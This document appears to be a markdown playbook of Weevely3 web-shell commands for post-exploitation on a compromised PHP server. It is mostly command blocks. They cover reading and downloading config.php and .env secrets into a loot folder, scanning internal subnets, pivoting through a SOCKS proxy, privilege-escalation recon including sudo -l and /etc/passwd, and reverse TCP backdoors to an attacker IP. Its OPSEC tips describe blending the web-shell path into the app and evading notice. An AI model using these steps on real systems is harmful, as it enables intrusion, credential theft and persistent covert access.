# Weevely3 Module Playbooks

## Fast Post-Upload Triage

```text
:system_info
:shell_sh "id && uname -a && pwd"
:file_ls .
:audit_phpconf
```

Goal: confirm execution context, privileges, writable paths, PHP restrictions.

## File Discovery & Looting

```text
:file_find /var/www -name config.php
:file_read /var/www/html/.env
:file_download /var/www/html/config.php ./loot/config.php
```

Use `:file_check` on sensitive files before reads/writes.

## Network Pivot Workflow

```text
:net_ifconfig
:net_scan 10.0.0.0/24 22,80,443,3306
:net_proxy 127.0.0.1 1080
```

Then pivot tooling through SOCKS proxy on attacker side.

## Privilege Escalation Recon

```text
:audit_suidsgid
:audit_filesystem
:audit_etcpasswd
:shell_sh "sudo -l"
```

Use findings to move into dedicated Linux escalation skills/tools.

## Backdoor and Shell Modules

```text
:backdoor_reversetcp <attacker-ip> <port>
:backdoor_tcp <port>
:shell_sh "whoami"
```

Choose reverse TCP when ingress to target is blocked.

## OPSEC Notes

- Keep agent path naming blend-in with app structure.
- Avoid repeated noisy scans from the same foothold.
- Remove temporary uploaded tooling when done.
- Review webserver logs and app logs impact before broad module use.

## Source Pointers

- Upstream weevely3 README and wiki module catalog
- Kali tooling docs for command syntax patterns
